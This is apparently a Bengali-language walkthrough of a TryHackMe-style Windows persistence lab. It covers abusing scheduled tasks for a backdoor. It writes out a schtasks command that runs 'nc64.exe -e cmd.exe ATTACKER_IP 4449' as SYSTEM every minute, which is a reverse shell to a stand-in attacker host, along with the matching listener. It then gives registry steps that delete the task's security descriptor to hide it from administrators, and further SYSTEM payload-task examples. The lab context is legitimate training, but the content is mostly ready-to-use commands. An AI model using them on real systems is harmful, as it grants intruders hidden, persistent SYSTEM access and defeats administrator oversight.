# 📅 টাস্ক ৫: শিডিউল্ড টাস্কের অপব্যবহার (Abusing Scheduled Tasks)

**ধারণা:** উইন্ডোজ শিডিউল্ড টাস্ক হলো এমন একটি বৈধ ফিচার যা নির্দিষ্ট সময় অন্তর বা নির্দিষ্ট ইভেন্ট ঘটলে স্বয়ংক্রিয়ভাবে প্রোগ্রাম চালায়। হ্যাকাররা এই ফিচারটি ব্যবহার করে এমন টাস্ক তৈরি করে যা নির্দিষ্ট সময় পর পর তাদের রিভার্স শেল পাঠাবে। এটি পার্সিস্টেন্সের জন্য খুবই কার্যকরী একটি পদ্ধতি।

এই টাস্কে দুইটি প্রধান বিষয় আলোচনা করা হয়েছে:
1.  টাস্ক শিডিউলার ব্যবহার করে ব্যাকডোর তৈরি
2.  টাস্কটি অদৃশ্য (Invisible) করা

---

## 📋 পার্ট ১: টাস্ক শিডিউলার দিয়ে ব্যাকডোর তৈরি

**কৌশল:** `schtasks` কমান্ড ব্যবহার করে একটি শিডিউল্ড টাস্ক তৈরি করা যা নির্দিষ্ট সময় অন্তর আমাদের পেলোড চালাবে।

### ধাপে ধাপে নির্দেশনা

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | **শিডিউল্ড টাস্ক তৈরি:** | |
| | `schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM` | **/sc minute:** টাইম ইউনিট (মিনিট)<br>**/mo 1:** প্রতি ১ ইউনিট পর (প্রতি মিনিট)<br>**/tn:** টাস্কের নাম (THM-TaskBackdoor)<br>**/tr:** যে কমান্ড চলবে (রিভার্স শেল)<br>**/ru SYSTEM:** SYSTEM সুবিধায় চলবে |
| ২ | **টাস্ক তৈরি হয়েছে কিনা চেক:** | |
| | `schtasks /query /tn THM-TaskBackdoor` | টাস্কের বর্তমান অবস্থা এবং পরবর্তী রান টাইম দেখাবে। |
| ৩ | **লিসেনার চালু (অ্যাটাকার মেশিনে):** | |
| | `nc -lvp 4449` | পোর্ট ৪৪৪৯-এ রিভার্স শেলের জন্য অপেক্ষা করবে। |
| ৪ | **ফ্ল্যাগ সংগ্রহ:** | |
| | সংযোগ পাওয়ার পর `C:\flags\flag9.exe` রান করো। | **ফ্ল্যাগ ৯:** `THM{...}` (টাস্ক ভিজিবল থাকা অবস্থায়) |

## 👻 পার্ট ২: টাস্ক অদৃশ্য করা (Making Task Invisible)

**কৌশল:** শিডিউল্ড টাস্কের সিকিউরিটি ডেসক্রিপ্টর (SD) মুছে ফেলে টাস্কটিকে সব ইউজারের কাছ থেকে লুকিয়ে ফেলা। এমনকি অ্যাডমিনিস্ট্রেটরও টাস্কটি দেখতে পাবে না।

### কেন এটা কাজ করে?
- প্রতিটি শিডিউল্ড টাস্কের একটি **Security Descriptor (SD)** থাকে যা নির্ধারণ করে কে টাস্কটি দেখতে বা পরিবর্তন করতে পারবে।
- SD একটি ACL (Access Control List) হিসেবে কাজ করে।
- SD মুছে ফেললে উইন্ডোজ মনে করে কারোই টাস্কটি অ্যাক্সেস করার অনুমতি নেই।
- ফলে `schtasks /query` কমান্ড দিলেও টাস্কটি দেখায় না।

### ধাপে ধাপে নির্দেশনা

| ধাপ | কমান্ড / কাজ | ব্যাখ্যা |
|:---:|:---|:---|
| ১ | **SYSTEM হিসেবে Regedit চালু করা:** | |
| | `C:\tools\pstools\PsExec64.exe -i -s regedit` | শিডিউল্ড টাস্কের SD রেজিস্ট্রিতে সংরক্ষিত থাকে যা শুধুমাত্র SYSTEM অ্যাকাউন্ট পরিবর্তন করতে পারে। |
| ২ | **রেজিস্ট্রি পাথে নেভিগেট করা:** | |
| | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\THM-TaskBackdoor` | এখানে প্রতিটি শিডিউল্ড টাস্কের জন্য আলাদা কী থাকে। |
| ৩ | **SD ভ্যালু ডিলিট করা:** | |
| | `SD` নামের ভ্যালুটি খুঁজে বের করে **Delete** করো (রাইট ক্লিক → Delete)। | এটি টাস্কের সকল পারমিশন মুছে ফেলবে। |
| ৪ | **টাস্ক লুকানো হয়েছে কিনা চেক:** | |
| | `schtasks /query /tn THM-TaskBackdoor` | এখন এরর আসবে: `ERROR: The system cannot find the file specified.` |
| ৫ | **ভেরিফিকেশন:** | |
| | লিসেনার চালু থাকলে দেখবে টাস্কটি এখনো প্রতি মিনিটে রিভার্স শেল পাঠাচ্ছে, কিন্তু কেউ টাস্ক লিস্টে দেখতে পাচ্ছে না। | টাস্কটি পুরোপুরি অদৃশ্য! |

## 📊 টাস্ক শিডিউলার প্যারামিটার রেফারেন্স

### `schtasks /create` এর গুরুত্বপূর্ণ অপশন

| অপশন | পূর্ণরূপ | ব্যাখ্যা | উদাহরণ |
|:---|:---|:---|:---|
| `/sc` | Schedule | কত সময় অন্তর চলবে | `/sc minute`, `/sc hourly`, `/sc daily`, `/sc onstart` |
| `/mo` | Modifier | Schedule-এর মডিফায়ার | `/mo 1` (প্রতি ১ ইউনিট), `/mo 30` (প্রতি ৩০ ইউনিট) |
| `/tn` | Task Name | টাস্কের নাম | `/tn THM-TaskBackdoor` |
| `/tr` | Task Run | যে কমান্ড/প্রোগ্রাম চলবে | `/tr "c:\tools\nc64.exe -e cmd.exe IP PORT"` |
| `/ru` | Run As | যে ইউজার অ্যাকাউন্টে চলবে | `/ru SYSTEM`, `/ru Administrator` |
| `/rp` | Run Password | ইউজারের পাসওয়ার্ড (যদি প্রয়োজন) | `/rp Password123` |
| `/f` | Force | জোর করে তৈরি (ওভাররাইট) | `/f` |
| `/it` | Interactive | ইন্টারঅ্যাক্টিভ সেশনে চলবে | `/it` |

### সাধারণ ব্যবহারের উদাহরণ

```cmd
# সিস্টেম চালু হওয়ার সময় রান করা
schtasks /create /sc onstart /tn MyBackdoor /tr "c:\payload.exe" /ru SYSTEM

# প্রতিদিন নির্দিষ্ট সময়ে রান করা
schtasks /create /sc daily /st 09:00 /tn MorningTask /tr "c:\payload.exe" /ru SYSTEM

# প্রতি ৫ মিনিট পর পর রান করা
schtasks /create /sc minute /mo 5 /tn FrequentTask /tr "c:\payload.exe" /ru SYSTEM

# নির্দিষ্ট ইভেন্টে রান করা (যেমন ইউজার লগইন)
schtasks /create /sc onlogon /tn LogonTask /tr "c:\payload.exe" /ru SYSTEM
